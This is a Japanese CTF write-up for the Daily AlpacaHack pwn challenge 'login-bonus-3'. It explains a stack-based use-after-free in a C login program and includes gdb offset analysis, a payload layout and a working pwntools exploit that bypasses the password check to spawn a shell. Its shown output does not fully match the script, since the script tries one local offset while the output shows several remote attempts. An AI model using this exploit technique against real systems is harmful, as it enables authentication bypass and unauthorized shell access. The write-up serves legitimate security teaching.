---
title: Daily-AlpacaHack 「login-bonus-3」Hard
description: Stack-based Use-After-Free
date: 2026-06-01 20:35:00 +0900
categories: [CyberSecurity, CTF]
tags: [daily_alpaca_hack, pwn, vuln/stack_based_use_after_free, linux]
---

# 20260531-daily_alpaca-pwn-hard-login_bonus_3

## Summary

本問は，関数終了後もスタック上のローカル変数のアドレスが保持され続ける (**Stack-based Use-After-Free**) 脆弱性を突く問題です．
後続の関数で同じスタック領域が再利用される性質を利用し，入力バッファ経由でゴーストポインタが指すメモリを改ざんすることで，認証を回避してシェルを奪取します．

> - **Category**: Pwn
> - **Description**: パスワードを当てられますか？
> - **Tools & TechStack**:
> 	- Python
> 	- Pwntools
> 	- Checksec
> 	- gdb (pwndbg)
{: .prompt-info }

**階層構造**
```
.
├── login
└── login.c

1 directory, 2 files
```

---
## Solution Path

### バイナリ保護機構

PIEは無効ですが，CanaryやNXビットは有効です．スタックバッファオーバーフローによる戻りアドレスの直接書き換えは困難であることが分かりました．

```shell
$ file login
login: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

$ checksec --file=login          
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

### ソースコード調査

`generate_password()` 内の `*password = secret;` にバグが存在します． ローカル変数 `secret` はスタック領域に確保されているため，関数が終了するとスタックフレームとともに解放されます．
しかし，`main()` 側の `password` ポインタには，**既に解放された領域のアドレス** が保持されたまま `auth(password)` に渡されてしまいます．

```c
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>
#include <unistd.h>

#define LEN_PWD 16

void generate_password(char **password) {
  int seed;
  char secret[32] = {};
  *password = secret; // BUG: secret配列の先頭アドレスをpasswordに代入している．関数終了時に寿命が尽きる

  /* Generate random password */
  getrandom(&seed, sizeof(seed), 0);
  srand(seed);
  for (size_t i = 0; i < LEN_PWD; i++)
    secret[i] = 'A' + (rand() % 26);
}

void auth(const char *password) {
  char input[256];
  input[sizeof(input) - 1] = '\0';

  /* Input password */
  write(1, "Password: ", 10);
  for (size_t i = 0; i < sizeof(input) - 1; i++) {
    if (read(0, input + i, 1) != 1 || input[i] == '\n') {
      input[i] = '\0';
      break;
    }
  }

  /* Check password */
  // 入力文字列とパスワードの長さ不一致 || 比較
  if (strlen(input) != LEN_PWD || strcmp(input, password)) {
    write(1, "[-] Wrong password\n", 19);
  } else {
    write(1, "[+] Success\n", 12);
    system("/bin/sh");
  }
}

int main(int argc, char **argv) {
  char *password;
  generate_password(&password); // BUG: passwordに消滅したはずのsecretのアドレスが入る
  auth(password);
  return 0;
}
```

### 脆弱性調査とスタックレイアウト

関数が呼ばれるとき，スタックは **高アドレス(下)** から **低アドレス(上)** に向かって伸びます．
1. `main()` から `generate_password()` が呼ばれ，スタック上に `secret[32]` が配置される．
2. `generate_password()` が終了しスタックポインタが戻るが，メモリ内の値はクリアされない．
3. `auth()` が呼ばれると，先ほどまで `generate_password()` が使っていた領域と **ほぼ同じ位置** に `auth()` のスタックフレームが構築される．
この結果，`auth()` のローカル変数 `char input[256]` は，`secret` が存在していた領域を上書きするように配置されます．

#### gdbによるオフセット調査

pwndbgを用いて，`secret` のアドレスと `input` の先頭アドレスのオフセットを調査します．
`input` の先頭から **`224` バイト進んだ先** に，`password` ポインタが指し続けている旧 `secret` 領域が存在することが確認できました．
`input` は `256` バイト領域なため，`input` への入力によって `password` が指す中身を操作することができます．

```shell
pwndbg> disas generate_password
Dump of assembler code for function generate_password:
   0x00000000004011e9 <+67>:    mov    QWORD PTR [rax],rdx
   0x00000000004011ec <+70>:    lea    rax,[rbp-0x3c]
   0x00000000004011f0 <+74>:    mov    edx,0x0

pwndbg> b *0x00000000004011f0
Breakpoint 1 at 0x4011f0

pwndbg> p $rdx
$1 = 0x7fffffff7540

pwndbg> d 2

pwndbg> disas auth
Dump of assembler code for function auth:
   0x0000000000401323 <+178>:   lea    rax,[rbp-0x110]
   0x000000000040132a <+185>:   mov    rdi,rax
   0x000000000040132d <+188>:   call   0x401040 <strlen@plt>

pwndbg> b *0x000000000040132d
Breakpoint 1 at 0x40132d

pwndbg> p $rdi
$4 = 0x7fffffff7460

pwndbg> distance 0x7fffffff7540 0x7fffffff7460
0x7fffffff7540->0x7fffffff7460 is -0xe0 bytes (-0x1c words)
```

### 条件バイパス

`if (strlen(input) != LEN_PWD || strcmp(input, password)` を回避するために，2つの条件をバイパスする必要があります．
以下の例を見ると，`*password` の `0x7fffffff7540` が `input[256]` 内に存在します．

**例: `input[256]` に対して，`255` バイト分の `A(0x41)` を入力**
```shell
pwndbg> x/256xb 0x7fffffff7460
# input[256] の先頭
0x7fffffff7460: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7468: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7470: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7478: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7480: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7488: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7490: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7498: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74a0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74a8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74b0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74b8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74c0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74c8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74d0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74d8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74e0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74e8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74f0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff74f8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7500: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7508: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7510: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7518: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7520: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7528: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7530: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7538: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
# ここが *passwordの先頭 (input内部に包含している)
0x7fffffff7540: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7548: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7550: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffff7558: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x00
```

#### 1. `strlen(input) != LEN_PWD)`

`#define LEN_PWD 16` と `strlen(input) != LEN_PWD` より，`input[]`  に入力できる文字列が **16** バイト分に縛られています．
また，C言語の仕様として，`strlen()` は渡された文字列の **始まり** から **終わり (NULL終端文字 `\n`)** までのバイト長を返します．
なので，`input[]` の途中で `\0` を入れることでこの条件を回避することができます．

- **バイパス手法**: `input[]` の最初から `A` を16文字入れた後に，`\0` を入れる．

#### 2. `strcmp(input, password)`

`password` ポインタは `input + 224` の位置を指しています． 
`read()` 等のバッファを介する入力は **低アドレス** から **高アドレス** へ順に書き込まれるため，**`224 - 16 - 1 = 207` のパディング** を挟んだ後に，先頭と同じ16バイトの `A` と `\0` (`fake_pass`) を書き込みます．

### Exploitation

1. `dummy_pass + null_byte`:  `strlen()` での文字列制限を回避
2. `padding`:  `*password = secret` が指すアドレスまで適当な値を埋める
3. `fakepass`:  `*password` に到達したら，`dummy_pass` と同じ値で埋める

**ペイロード構造**
```
低アドレス <----------------------------------------> 高アドレス
[A...A (16)] [0x00] [B...B (207)] [A...A (16)] [0x00] [\n]
|---------| |----| |-padding-| |----------| |----| |---|
 16bytes     1byte     207bytes      17bytes     1byte  1byte
                                  |-------------------|
                                      fake_pass
```

`exploit.py`
```python
from pwn import *

target_ip = '34.170.146.252'
target_port = 21982

def solve(offset):
    # io = remote(target_ip, target_port)
    io = process("./login")

    # ペイロード作成
    dummy_pass = b"A" * 16
    null_byte = b"\x00"

    # 試行するオフセットに基づいてパディングを調整
    padding_length = offset - len(dummy_pass) - len(null_byte)
    # パディングをBで全埋め
    padding = b"B" * padding_length
    fake_pass = b"A" * 16 + b"\x00"

    payload = dummy_pass + null_byte + padding + fake_pass + b"\n"

    try:
        io.sendafter(b"Password: ", payload)
        # Successが返ってくるか確認
        res = io.recvline(timeout=1)
        if b"Success" in res:
            print(f"[+] Found offset: {offset}")
            io.interactive()
            return True
        else:
            io.close()
            return False
    except EOFError:
        io.close()
        return False

offset = 224
print(f"[*] Trying offset: {offset}")
solve(offset)
```

```shell
$ python3 exploit.py
[*] Trying offset: 200
[+] Opening connection to 34.170.146.252 on port 21982: Done
[*] Closed connection to 34.170.146.252 port 21982
#...
[*] Trying offset: 224
[+] Opening connection to 34.170.146.252 on port 21982: Done
[+] Found offset: 224
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag-0fad3b0b2eeae8a40fba5f4bbc6f200c.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag-0fad3b0b2eeae8a40fba5f4bbc6f200c.txt
{*** REDACTED ***}
[*] Got EOF while reading in interactive
```

---
## Post-Mortem & Dead ends

## References
